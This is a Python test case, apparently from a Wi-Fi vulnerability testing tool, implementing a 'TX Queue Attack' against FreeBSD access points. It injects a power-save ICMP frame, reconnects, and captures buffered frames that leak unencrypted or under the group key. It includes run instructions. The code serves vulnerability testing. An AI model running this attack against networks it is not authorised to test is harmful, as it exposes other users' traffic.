# Import dependencies and libraries.
from dependencies.libwifi.wifi import *
from dependencies.libwifi.crypto import decrypt_ccmp
from library.testcase import Trigger, Action, Test

# -------------------------------------------------------------------------------------
# --- Helper Functions ----------------------------------------------------------------
# -------------------------------------------------------------------------------------

def search_for_leak(station, frame):
	""" Search for a leak, i.e., a plaintext or group-key encrypted ICMP-frame.
	"""
	
	# Filter for WEP/CCMP-Encapsulated frames from the AP.
	if frame[Dot11].addr2 != station.bss:
		return False
	if not (frame.haslayer(Dot11WEP) or frame.haslayer(Dot11CCMP)):
		return False
		
	# Parse WEP-Encapsulated.
	if frame.haslayer(Dot11WEP):
		log(STATUS, "Received WEP-Encapsulated frame.", color="orange")
		
		# Dot11WEP is in fact plaintext with a "protected" header bit.
		plaintext = frame[Dot11QoS].payload
		plaintext = LLC(plaintext) # Parse to LLC()/SNAP()/IP()/ICMP().
		leaktype = "Plaintext"
		
	# Parse CCMP-Encapsulated.
	if frame.haslayer(Dot11CCMP):
		log(STATUS, "Received CCMP-Encapsulated frame.", color="orange")
		
		# Check if the frame was decrypted in hardware.
		plaintext = frame[Dot11CCMP].data
		plaintext = LLC(plaintext) # Parse to LLC()/SNAP()/IP()/ICMP().
		if plaintext is not None and plaintext.haslayer(ICMP):
			log(ERROR, "WARNING: Your Wi-Fi Dongle may be performing hardware decryption.")
			log(ERROR, "WARNING: Please verify the frame was protected with the group-key.")
			log(ERROR, "WARNING: NOTE: Dot11CCMP Key ID = {}.".format(frame[Dot11CCMP].key_id))
			# E.g., inspect the value in "cat /sys/module/ath9k_htc/parameters/nohwcrypt".
			leaktype = "CCMP-Hardware"
			
		# If not successful, try to decrypt the frame with the group-key.
		else:
			plaintext = decrypt_ccmp(frame.getlayer(Dot11), tk=station.gtk, verify=False)
			leaktype = "CCMP-GTK"
	
	# Verify if we identified an ICMP-frame.
	if plaintext is None or not plaintext.haslayer(ICMP):
		return False
	log(STATUS, plaintext.summary(), color="orange")
	log(STATUS,"Detected an ICMP-frame from AP using {} encapsulation.".format(leaktype), color="green")
	return True
	
# -------------------------------------------------------------------------------------
# --- FreeBSD TX Queue Leaks ----------------------------------------------------------
# -------------------------------------------------------------------------------------
		
class QueueFreeBSD(Test):
	""" TX Queue Attack against a FreeBSD AP.
	"""
	name = "queue-leak-freebsd"
	kind = Test.Supplicant
	
	# Instructions:
	# cd setup; ./load-config.sh wpa2-personal
	# clear; ./run.py wlan0 queue-leak-freebsd

	def __init__(self):
		super().__init__([
			# Inject ICMP-Ping Request with the sleep-bit set.
			Action( trigger=Trigger.Connected, action=Action.Inject ),
			# Reconnect to the FreeBSD AP.
			Action( trigger=Trigger.NoTrigger, action=Action.Reconnect ),
			# Inject arbitrary frame to wake up.
			Action( trigger=Trigger.Associated, action=Action.Inject ),
			# Listen for queue leaks, terminate on success.
			Action( trigger=Trigger.NoTrigger, action=Action.Receive ),
			Action( trigger=Trigger.Received, action=Action.Terminate )
		])
		# Predefined Variables.
		self.srcip = '192.168.0.189'
		self.dstip = '192.168.0.1'

	def receive(self, station, frame):
		return search_for_leak(station, frame)
		
	def generate(self, station):

		# Inject ICMP-Ping Request with the sleep-bit set.
		frame = station.get_header() # Returns Dot11QoS()-header.
		frame.FCfield |= Dot11(FCfield="pw-mgt").FCfield
		frame /= LLC()/SNAP()/IP(src=self.srcip,dst=self.dstip)/ICMP()
		self.actions[0].set_frame( frame , mon=True , encrypt=True )
		self.actions[0].set_delay( delay=1 )
		
		# Skip authentication frames upon reconnection.
		self.actions[1].set_optimized(1)

		# Inject arbitrary frame to wake up.
		frame = station.get_header() # Returns Dot11QoS()-header.
		frame = frame/Raw(b"wake-up-frame")
		self.actions[2].set_frame( frame , mon=True , encrypt=False )

		# Listen for queue leaks.
		self.actions[3].set_receive( self.receive , mon=True )
		